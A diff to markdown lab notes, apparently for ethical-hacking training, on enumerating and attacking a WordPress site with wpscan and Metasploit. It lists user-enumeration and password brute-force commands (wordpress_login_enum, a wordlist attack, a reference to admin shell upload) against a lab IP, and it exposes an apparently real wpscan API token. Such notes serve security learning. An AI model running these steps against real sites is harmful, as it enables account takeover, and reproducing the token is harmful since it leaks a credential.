@@ -43,6 +43,39 @@ msf exploit(wp_admin_shell_upload) > exploit
 wpscan --url https://example/ --passwords wordlist.txt --usernames samson
 </code></pre>
 
-### Additional References:
+### **Enumerate and hack a web app using wpscan and metasploit**
 
-[https://www.geeksforgeeks.org/wpscan-tool-in-kali-linux/](https://www.geeksforgeeks.org/wpscan-tool-in-kali-linux/)
+* wpscan — api-token hWt9qrMZFm7MKprTWcjdasowoQZ7yMccyPg8lsb8ads — url [http://10.10.10.16:8080/CEH](http://10.10.10.16:8080/CEH) — plugins-detection aggressive — enumerate u
+* — enumerate u: Specify the enumeration of users
+* API Token: Register at [https://wpscan.com/register](https://wpscan.com/register)
+* Mine: hWt9qrMZFm7MKprTWcjdasowoQZ7yMccyPg8lsb8ads
+* service postgresql start
+* msfconsole
+* use auxiliary/scanner/http/wordpress\_login\_enum
+* show options
+* set PASS\_FILE password.txt
+* set RHOST 10.10.10.16
+* set RPORT 8080
+* set TARGETURI [http://10.10.10.16:8080/CEH](http://10.10.10.16:8080/CEH)
+* set USERNAME admin
+* run
+* Find the credential
+
+###
+
+### Additional Resources
+
+{% embed url="https://www.geeksforgeeks.org/wpscan-tool-in-kali-linux/" %}
+
+{% embed url="https://blog.sucuri.net/2015/12/using-wpscan-finding-wordpress-vulnerabilities.html" %}
+
+{% embed url="https://www.hackingtutorials.org/web-application-hacking/hack-a-wordpress-website-with-wpscan/" %}
+
+{% embed url="https://linuxhint.com/wpscan_wordpress_vulnerabilities_scan/" %}
+
+{% embed url="https://www.wpwhitesecurity.com/strong-wordpress-passwords-wpscan/" %}
+
+
+
+
+
